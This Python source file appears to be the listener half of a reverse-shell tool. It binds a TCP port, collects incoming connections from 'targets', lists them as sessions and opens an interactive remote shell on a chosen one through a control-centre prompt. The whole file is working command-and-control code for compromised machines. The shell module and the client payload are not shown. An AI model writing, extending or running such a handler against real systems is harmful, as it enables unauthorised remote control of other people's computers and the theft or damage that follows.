#!/usr/bin/env python3
"""server"""
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SOCK_DGRAM
from socket import socket
from threading import Thread

from lib.stdout import usage, COLOR, Title
from src.server.shell import Shell


class Server:
    """The server on the other end of the client (reverse shell)"""

    def __init__(self) -> None:
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.ips = []
        self.targets = []
        self.clients = 0
        self.stop_threads = False

    def sock_object(self) -> None:
        """Initiate the socket"""
        sock = socket(AF_INET, SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ipv4 = sock.getsockname()[0]
        sock.close()
        try:
            self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.sock.bind((ipv4, 54321))
            self.sock.listen(5)
        except OSError as err:
            COLOR.b_red.print(err)

    def thread(self) -> None:
        """Initiate the thread"""
        thread = Thread(target=self.server)
        thread.start()

    def show_targets(self) -> None:
        """Display the targets that the server may connect to"""
        count = 1
        for ipv4 in self.ips:
            prompt = f"Session {str(count)}. <---> {str(ipv4)}"
            COLOR.grn.print(prompt)
            count += 1
        print()

    def start_session(self, cmd: str) -> None:
        """Start a session with a selected target"""
        try:
            sessions = int(cmd[8:]) - 1
            COLOR.grn.print("[+] Connection Established\n")
            cmd = Shell(self.ips, self.targets, sessions)
            cmd.shell()
        except (IndexError, ValueError, OSError):
            prompt = "[!] No Session Matches That Selection\n"
            COLOR.b_red.print(prompt)

    def exit_control(self) -> None:
        """Exit the control centre"""
        for target in self.targets:
            target.close()
        self.sock.close()
        self.stop_threads = True

    def control_centre(self) -> None:
        """Initiate the control centre"""
        while True:
            cmd = input(f"{Title().icon} ")
            if cmd[:7] in ("targets", "command") and (
                not self.targets or not self.ips
            ):
                COLOR.b_red.print("[!] No Targets Found.")
                COLOR.ylw.print("[*] Is a Reverse Shell Running?\n")
                continue
            if cmd == "targets":
                self.show_targets()
            elif cmd[:7] == "session":
                self.start_session(cmd)
                continue
            elif cmd == "exit":
                self.exit_control()
            else:
                COLOR.ylw.print(usage(session=True))

    def server(self) -> None:
        """Initiate the server"""
        while True:
            if self.stop_threads:
                break
            self.sock.settimeout(1)
            try:
                target, ipv4 = self.sock.accept()
                self.targets.append(target)
                self.ips.append(ipv4)
                COLOR.grn.print(f"\nConnected to {self.ips[self.clients]}!")
                self.clients += 1
            except OSError:
                pass


def main() -> None:
    """Initiate the server"""
    title = Title()
    server = Server()
    title.clear_screen()
    title.resheller()
    server.sock_object()
    server.thread()
    title.header()
    server.control_centre()
